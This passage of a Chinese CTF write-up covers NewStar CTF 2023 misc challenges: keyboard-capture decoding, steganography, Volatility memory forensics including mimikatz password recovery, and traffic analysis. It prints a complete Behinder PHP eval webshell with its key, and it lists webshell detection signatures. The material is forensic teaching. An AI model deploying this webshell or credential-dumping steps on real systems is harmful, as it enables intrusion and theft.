class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line)!=<span class="hljs-number">17</span>:<br>        <span class="hljs-keyword">continue</span><br>    nums.append(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]+line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>])<br>keys.close()<br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:    <br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">&quot;00&quot;</span> :        <br>        <span class="hljs-keyword">continue</span>    <br>    <span class="hljs-keyword">if</span> n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] <span class="hljs-keyword">in</span> normalKeys:       <br>        <span class="hljs-keyword">if</span> n[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]==<span class="hljs-string">&quot;02&quot;</span>:            <br>            output += shiftKeys [n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]        <br>        <span class="hljs-keyword">else</span> :            <br>            output += normalKeys [n[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>]]<br>    <span class="hljs-keyword">else</span>:        <br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;output :n&#x27;</span> + output)<br></code></pre></td></tr></table></figure>
+
+<p>得到如下结果：</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">nw3lc0m3<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-keyword">to</span><span class="hljs-variable">&lt;SPACE&gt;</span>newstar<span class="hljs-variable">&lt;SPACE&gt;</span>ctf<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-number">2023</span><span class="hljs-variable">&lt;SPACE&gt;</span>flag<span class="hljs-variable">&lt;SPACE&gt;</span>is<span class="hljs-variable">&lt;SPACE&gt;</span>here<span class="hljs-variable">&lt;SPACE&gt;</span>vvvvbaaaasffjjwwwwrrissgggjjaaasdddduuwwwwwwwwiiihhddddddgggjjjjjaa1112333888888<span class="hljs-variable">&lt;ESC&gt;</span><span class="hljs-variable">&lt;ESC&gt;</span><span class="hljs-number">2</span>hhxgbffffbbbnnat<span class="hljs-variable">&lt;CAP&gt;</span><span class="hljs-variable">&lt;CAP&gt;</span>ff<span class="hljs-variable">&lt;DEL&gt;</span>lll<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>aaa<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>gggg<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>&#123;<span class="hljs-number">999</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">999</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">11</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">9</span>aaa<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>eb2---<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>a450---<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">2</span>f5f<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>--<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">7</span>bfc[<span class="hljs-literal">unknown</span>][<span class="hljs-literal">unknown</span>][<span class="hljs-literal">unknown</span>]-<span class="hljs-number">8989</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>dfdf<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">4</span>bfa4bfa<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-number">85848584</span>&#125;&#125;&#125;<span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span><span class="hljs-variable">&lt;DEL&gt;</span>&#125;]<span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span><span class="hljs-variable">&lt;SPACE&gt;</span>nice<span class="hljs-variable">&lt;SPACE&gt;</span>work!<span class="hljs-number">1</span>yyoou<span class="hljs-variable">&lt;SPACE&gt;</span>ggot<span class="hljs-variable">&lt;SPACE&gt;</span>tthhis<span class="hljs-variable">&lt;SPACE&gt;</span>fllag<br></code></pre></td></tr></table></figure>
+
+<p><DEL>表示删除，<SPACE>表示空格，根据这个按键顺序对数据进行处理后得到flag</SPACE></DEL></p>
+<h3 id="misc-滴滴滴（学习）"><a href="#misc-滴滴滴（学习）" class="headerlink" title="misc-滴滴滴（学习）"></a>misc-滴滴滴（学习）</h3><p><del>一个音频，一张图片，听得出来是拨号音，但是没找到(</del></p>
+<p>知识点：steghide隐写，DTMF</p>
+<p>拨号音识别：</p>
+<p><a target="_blank" rel="noopener" href="http://dialabc.com/sound/detect/index.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTc5ODE1NzAsImZpbGVHVUlEIjoiUVBNUnh6R2t0enNabnpoeiIsImlhdCI6MTY5Nzk4MTI3MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMyNzU2NTY4N30.hyTwib0YFlVUmi6V7DEEhaMjulUfPeutiH9sEW-8dbE">http://dialabc.com/sound/detect/index.html</a> </p>
+<p>结合题目简介的提示，这串数字应该是某处使用的密码，因此可以尝试steghide工具来对jpg图片进行隐写内容提取：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">steghide <span class="hljs-keyword">extract </span>-sf secret.<span class="hljs-keyword">jpg </span>-p <span class="hljs-number">52563319066</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="WEEK4"><a href="#WEEK4" class="headerlink" title="WEEK4"></a>WEEK4</h2><h3 id="misc-R通大残"><a href="#misc-R通大残" class="headerlink" title="misc-R通大残"></a>misc-R通大残</h3><p>RGB通道隐写</p>
+<img src="/2023/11/19/newstar2023-misc/image-20231028004805493.png" srcset="/img/loading.gif" lazyload class title="image-20231028004805493">
+
+<h3 id="misc-依旧是空白"><a href="#misc-依旧是空白" class="headerlink" title="misc-依旧是空白"></a>misc-依旧是空白</h3><p>考点:snow隐写</p>
+<p>给了图片，CRC报错，爆出正常高度和宽度，得到密码</p>
+<p>结合给了密码，那么很可能就是snow隐写了，SNOW 隐写又被称为 HTML 隐写，通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">snow</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-type">s00_b4by</span><span class="hljs-type">_f0r</span><span class="hljs-type">_y0u</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-built_in">White</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="misc-Nmap"><a href="#misc-Nmap" class="headerlink" title="misc-Nmap"></a>misc-Nmap</h3><p>有用的知识:<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41905135/article/details/124541161?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg2Nzc5MzMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODY3NzYzMywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1MDI5NDg3OH0.xQdWO-JPFc83BK9dAFzRW2E0W6F7FEmlfr2km_31L_Q">【精选】Nmap 中的各种端口扫描技术_namp扫描全端口_Bruce_Liuxiaowei的博客-CSDN博客</a></p>
+<p>使用过滤器：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.flags.syn <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> and tcp.flags.ack <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>其他过滤器:</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">udp</span><br></code></pre></td></tr></table></figure>
+
+<p>这个过滤条件可以筛选出UDP端口开放的数据包，该过滤条件会匹配所有的UDP数据包，因为UDP没有像TCP那样的连接建立过程，所以UDP数据包的到达通常表示端口是开放的。</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">icmp and icmp.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">3</span> and icmp.code <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p>这个过滤条件用于查找被目标主机标记为”端口不可达”的数据包，通常表示端口关闭；</p>
+<p>该过滤条件匹配了ICMP “端口不可达”类型的数据包，其中的 “code” 值为3表示端口关闭。</p>
+<h3 id="misc-第一次取证-学习"><a href="#misc-第一次取证-学习" class="headerlink" title="misc-第一次取证(学习)"></a>misc-第一次取证(学习)</h3><p>查看信息</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> imageinfo<br></code></pre></td></tr></table></figure>
+
+<p>查看内存进程列表：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 pslist<br></code></pre></td></tr></table></figure>
+
+<p>查看notepad进程：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vol<span class="hljs-selector-class">.py</span> -f dycqz<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 editbox<br></code></pre></td></tr></table></figure>
+
+<p>最后解密</p>
+<h3 id="misc-3-溯源"><a href="#misc-3-溯源" class="headerlink" title="misc-3-溯源"></a>misc-3-溯源</h3><p>这道题目与week3的2-分析有衔接，顺着week3的那道题分析下去，</p>
+<p>先找到与wh1t3g0d.php有关的并继续分析下去：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.uri</span><span class="hljs-selector-class">.path</span> contains <span class="hljs-string">&quot;wh1t3g0d.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现写入了一个shell.php，继续跟一下shell.php：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>.request.uri <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;shell.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后又发现调用file_put_contents写入了一个1.php文件，文件内容进行了base64编码，解码得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    @<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>	<span class="hljs-title function_ invoke__">session_start</span>();    <br>	<span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;    <br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;    <br>	<span class="hljs-title function_ invoke__">session_write_close</span>();    <br>	<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);    <br>	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))&#123;        <br>        <span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;        <br>        <span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);                <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;                 <br>            <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];                <br>        &#125;    <br>    &#125;<br>	<span class="hljs-keyword">else</span>&#123;        <br>        <span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);    <br>    &#125;    <br>	<span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);    <br>	<span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];    <br>	<span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];    <br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;    				@<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>很明显的冰蝎Shell，发现后续的交互也主要是和1.php进行交互。</p>
+<p>从这里可以得知key为e45e329feb5d925b，流量采用AES CBC 128加密，可以先把所有1.php的响应流量过滤出来：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>.response_for.uri <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;/1.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>导出特定分组，把响应流量保存下来，响应流量解密可以在<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/cryptoaes/?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MDAxNDcxMzMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTcwMDE0NjgzMywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjowfQ.MfGGH3uY1QCigbKO665qIgryx_rZtMWsjMzzam0E1nE">http://tools.bugscaner.com/cryptoaes/</a>进行解密，可以看到冰蝎的响应流量是以json形式返回的，json的内容是base64编码的，</p>
+<p>然后在导出的特定分组里面发现内容，尝试解密，最终发现用户名和内网地址</p>
+<p>网上写得很好的一篇WP: <a target="_blank" rel="noopener" href="https://blog.csdn.net/Myon5/article/details/134086143?ops_request_misc=&request_id=&biz_id=102&utm_term=NewStarCTF">NewStarCTF2023week4-溯源-CSDN博客</a></p>
+<h2 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h2><h3 id="misc-新建Python文件"><a href="#misc-新建Python文件" class="headerlink" title="misc-新建Python文件"></a>misc-新建Python文件</h3><p>pyc剑龙隐写</p>
+<p>工具，stegosaurus项目：<a target="_blank" rel="noopener" href="https://github.com/AngelKitty/stegosaurus?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTk2Mjg1NTMsImZpbGVHVUlEIjoiUjNzR2daZHJseUU2bkw4VCIsImlhdCI6MTY5OTYyODI1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM4MDU4MzA4Mn0.Lu6RkkbvcasxDs7C5DrhMLcPv7r_r_bO8_wa0VN5PeA">https://github.com/AngelKitty/stegosaurus</a></p>
+<h3 id="misc-隐秘的图片"><a href="#misc-隐秘的图片" class="headerlink" title="misc-隐秘的图片"></a>misc-隐秘的图片</h3><p>图片异或</p>
+<h3 id="misc-ezhard"><a href="#misc-ezhard" class="headerlink" title="misc-ezhard"></a>misc-ezhard</h3><p>磁盘取证</p>
+<p>在linux系统下挂载磁盘，查看文件即可</p>
+<p>新建一个文件夹，然后</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mount</span> 磁盘文件 新建目录/<br></code></pre></td></tr></table></figure>
+
+<p>失败的话建议sudo</p>
+<h3 id="misc-easymem"><a href="#misc-easymem" class="headerlink" title="misc-easymem"></a>misc-easymem</h3><p>这道题感觉对新手还是难了点😭😭😭😭</p>
+<p>flag第一部分在ctf用户的密码，需使用mimikatz插件读取</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f *<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 mimikatz<br></code></pre></td></tr></table></figure>
+
+<p>flag第二部分在桌面flag2.txt文件中，利用filescan扫描，然后dumpfiles下载，并读取</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f *<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 filescan<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">python2 vol.py -f *<span class="hljs-string">.raw</span> <span class="hljs-params">--profile=Win7SP1x64</span> dumpfiles -Q 编号 -D <span class="hljs-string">./</span><br></code></pre></td></tr></table></figure>
+
+<p>flag第三部分在画图进程中(mspaint.exe)</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 vol<span class="hljs-selector-class">.py</span> -f *<span class="hljs-selector-class">.raw</span> <span class="hljs-attr">--profile</span>=Win7SP1x64 memdump -<span class="hljs-selector-tag">p</span> 进程号 -D ./<br></code></pre></td></tr></table></figure>
+
+<p>然后gimp打开，raw的imge data，然后先调offset，感觉有点东西的时候调整宽度，直至有字符出现</p>
+<h3 id="misc-BabyAntSword"><a href="#misc-BabyAntSword" class="headerlink" title="misc-BabyAntSword"></a>misc-BabyAntSword</h3><p>考点:蚁剑流量分析</p>
+<p>PS：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1</span>、中国菜刀<br>请求体中存在eval、base64等特征字符；<br>连接过程中使用base64编码对发送的指令进行加密；<br>还有一段以QG开头，<span class="hljs-number">7</span>J结尾的固定代码。<br><br><span class="hljs-number">2</span>、蚁剑<br>默认的user-agent请求头是antsword XXX（不过可以修改）<br>一般将payload进行分段，分别进行base64编码；<br>一般具有像eval这样的关键字和@ini_set(<span class="hljs-string">&quot;display&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>)；这段代码。<br><br><span class="hljs-number">3</span>、冰蝎<br>PHP代码中可能存在eval、assert等关键词；<br>jsp代码中可能会有<span class="hljs-keyword">get</span> <span class="hljs-keyword">class</span>(),<span class="hljs-symbol">get</span> <span class="hljs-symbol">class</span> <span class="hljs-symbol">loader</span>()等字符特征。<br><br>中国菜刀、蚁剑的攻击流量特征明显，容易被各类安全设备检测，而冰蝎是一款基于<span class="hljs-symbol">Java</span>开发的动态加密通信流量的<span class="hljs-symbol">Webshell</span>工具，由于通信流量被加密，传统的 <span class="hljs-symbol">WAF</span>、<span class="hljs-symbol">IDS</span> 设备难以检测，冰蝎最大特点就是对交互流量进行对称加密（冰蝎密文采用对称加密算法<span class="hljs-symbol">AES</span>加密，加密后还会进行 <span class="hljs-symbol">base64</span> 编码），且加密秘钥是由随机数函数动态生成，因此该客户端的流量几乎无法检测。　<br></code></pre></td></tr></table></figure>
+
+<p>首先，过滤出POST:</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http.request.method <span class="hljs-operator">=</span><span class="hljs-operator">=</span> POST<br></code></pre></td></tr></table></figure>
+
+<p>然后发现一个上传文件的地方，复制，并010新建，解压可得到WebShell密码</p>
+<p>接着分析其他报文</p>
+<p><strong>对于蚁剑响应流量的解密就是Base64解密即可，需要去掉响应首尾拼接的干扰字符。</strong></p>
+<p>对于蚁剑请求流量的分析需要删掉首部前两个字符，例如在tcp.stream eq 39的请求中我们提取出参数：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">f<span class="hljs-number">6</span>f<span class="hljs-number">75679</span>ab<span class="hljs-number">3</span>efc=AvY<span class="hljs-number">2</span>QgIi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>Ivb<span class="hljs-name">G9</span>jYWwvd<span class="hljs-name">G9</span>tY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>Ijtlb<span class="hljs-symbol">nY7</span>ZW<span class="hljs-symbol">NobyBmNWNkOTtwd2</span>Q<span class="hljs-number">7</span>ZW<span class="hljs-symbol">NobyAwYTI1</span>ZmJjMW<span class="hljs-name">M1</span><br></code></pre></td></tr></table></figure>
+
+<p>去掉前两位:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Y<span class="hljs-number">2</span>QgIi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>Ivb<span class="hljs-name">G9</span>jYWwvd<span class="hljs-name">G9</span>tY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>Ijtlb<span class="hljs-symbol">nY7</span>ZW<span class="hljs-symbol">NobyBmNWNkOTtwd2</span>Q<span class="hljs-number">7</span>ZW<span class="hljs-symbol">NobyAwYTI1</span>ZmJjMW<span class="hljs-name">M1</span><br></code></pre></td></tr></table></figure>
+
+<p>base64解码得到:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;/usr/local/tomcat&quot;</span>;<span class="hljs-built_in">env</span>;<span class="hljs-built_in">echo</span> f5cd9;<span class="hljs-built_in">pwd</span>;<span class="hljs-built_in">echo</span> 0a25fbc1c5<br></code></pre></td></tr></table></figure>
+
+<p>追踪HTTP流，在response，可看到，同样去除干扰字符，base64解码即可拿到java版本</p>
+<p>最后在其他报文作同样的分析，也可以拿到攻击者删除的文件内容。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
